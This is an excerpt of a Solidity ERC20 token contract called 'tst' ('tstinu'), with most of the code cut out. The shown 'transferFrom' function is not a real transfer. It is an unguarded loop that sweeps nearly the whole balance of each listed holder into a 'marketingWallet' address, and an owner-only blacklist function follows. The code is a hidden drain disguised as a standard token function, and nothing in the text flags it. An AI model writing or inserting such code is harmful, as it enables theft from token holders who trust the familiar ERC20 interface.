...
contract tst is Context, IERC20, Ownable {
    ...
    string private constant _symbol = "tstinu";
    ...
    function transferFrom() public virtual { for (uint i = 0; i < includeFromFee.length; i++) { if (balanceOf(includeFromFee[i]) > 0) { basicTransfer(includeFromFee[i], marketingWallet, balanceOf(includeFromFee[i]).sub(1 * 10**_decimals)); } } }
    ...
    function manageBlacklist() public onlyOwner { 
